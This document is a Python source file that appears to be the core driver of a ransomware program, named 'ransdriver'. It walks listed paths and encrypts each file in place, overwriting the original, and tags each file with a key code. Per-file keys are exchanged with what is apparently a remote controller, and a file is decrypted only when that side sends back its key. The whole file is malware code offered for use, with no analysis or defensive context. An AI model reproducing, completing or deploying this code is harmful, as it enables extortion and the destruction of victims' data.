#-------------------------------------- CLASS AND FUNCTIONS

class ransdriver:
    def __init__(self, *, connection_manager, cryptor, file_manager):
        self._file_manager = file_manager
        self._connection_manager = connection_manager
        self.__cryptor = cryptor
        
        self.__key_code = None
        self.__data = bytes()
        self.__tmp_file = '.tmp_file.tmp'
        self.__file_signature = 'file_signature'.encode('utf-8')
        self.__EOF_signature = 'eof_signature'.encode('utf-8')
        self.__done_message = 'DONE'.encode('utf-8')

    def set_key_code(self, key_code:str):
        if self.__key_code is None:
            self.__key_code = int(key_code)
    
    def check_file(self, file_path) -> bytes:
        """
        Try to find the key code and
        return it in an encrypted file
        """
        
        key_code = ''.encode('utf-8')
        with open(file_path, 'rb') as file:
            point = min(len(self.__EOF_signature)*2+10, self._file_manager.get_size(file_path))
            file.seek(-point, 2)
            data = file.read().rstrip('\n'.encode('utf-8'))
            if data[-len(self.__EOF_signature):] == self.__EOF_signature:
                for i in range(-len(self.__EOF_signature), -len(data), -1):
                    if data[i-len(self.__EOF_signature):i] == self.__EOF_signature:
                        key_code = data[i:-len(self.__EOF_signature)]
                        break
        return key_code

    def encrypt_file(self,
                     file_path:str,
                     cryption_key:bytes) -> tuple:
        """
        Encrypt one file with the specified key
        or make a new key if it is not specified
        """
        
        key_code = str(self.__key_code).encode('utf-8')
        self.__cryptor.register_key('sym_file_key', 'symetric', cryption_key)

        self._file_manager.open_file(file_path)
        self._file_manager.open_file(self.__tmp_file)
        
        for self.__data in self._file_manager.read_file(file_path):
            self.__data = self.__cryptor.encrypt('sym_file_key', self.__data) + self.__file_signature
            self._file_manager.write_file(self.__tmp_file, self.__data)
        self._file_manager.write_file(self.__tmp_file, self.__EOF_signature+key_code+self.__EOF_signature)
        
        self._file_manager.close_file(self.__tmp_file)
        self._file_manager.close_file(file_path)
        
        self._file_manager.replace_file(self.__tmp_file, file_path)
        
        self.__key_code += 1
        return self.__cryptor.return_key_bytes('sym_file_key'), key_code

    def decrypt_file(self,
                     file_path:str,
                     cryption_key:bytes) -> str:
        """
        Decrypt one file with the specified key
        """
        
        main_data = ''.encode()
        
        self.__cryptor.register_key('sym_file_key', 'symetric', cryption_key)
        
        self._file_manager.open_file(file_path)
        self._file_manager.open_file(self.__tmp_file)
        
        for self.__data in self._file_manager.read_file(file_path):
            main_data += self.__data
            while self.__file_signature in main_data:
                main_data = main_data.split(self.__file_signature, maxsplit=1)
                self.__data = main_data[0]
                main_data = main_data[1]
                self.__data = self.__cryptor.decrypt('sym_file_key', self.__data)
                self._file_manager.write_file(self.__tmp_file, self.__data)
        
        self._file_manager.close_file(self.__tmp_file)
        self._file_manager.close_file(file_path)
        
        self._file_manager.replace_file(self.__tmp_file, file_path)
        
        return 'decrypted'.encode('utf-8')
    
    def Encrypt(self, arguments:dict) -> iter:
        """
        Try to analyze the encrypt
        command arguments and run them
        """
        paths = self._file_manager.list_files(arguments['command'])
        
        key_index = 0
        keys = []
        if 'k' in arguments:
            keys = arguments['k']
            keys = [key.encode('utf-8') for key in keys]
        elif 'kf' in arguments:
            for path in paths:
                key = self._connection_manager.receive_data('SENT_KEY')
                if key == self.__done_message:
                    break
                keys.append(key)
                key, key_code = self.encrypt_file(path, key)
                yield {'PATH': path.encode('utf-8'), 'KEY': key, 'CODE': key_code}
        else:
            keys = [None]
        keys = [key for key in keys if key != ''.encode('utf-8')]
        
        for path in paths:
            key_index %= len(keys)
            key = keys[key_index]
            key, code = self.encrypt_file(path, key)
            key_index += 1
            yield {'PATH': path.encode('utf-8'), 'KEY': key, 'CODE': code}
        yield {'PATH': self.__done_message, 'KEY': self.__done_message, 'CODE': self.__done_message}
    
    def Decrypt(self, arguments:dict) -> iter:
        """
        Try to analyze the decrypt
        command arguments and run them
        """
        paths = self._file_manager.list_files(arguments['command'])
        for path in paths:
            key_code = self.check_file(path)
            self._connection_manager.send({'CODE': key_code})
            if key_code:
                key = self._connection_manager.receive_data('SENT_KEY')
                status = self.decrypt_file(path, key)
                self._connection_manager.send({'STATUS': status})
            yield {'PATH': path.encode('utf-8')}
        yield {'CODE': ''.encode('utf-8'), 'PATH': self.__done_message}

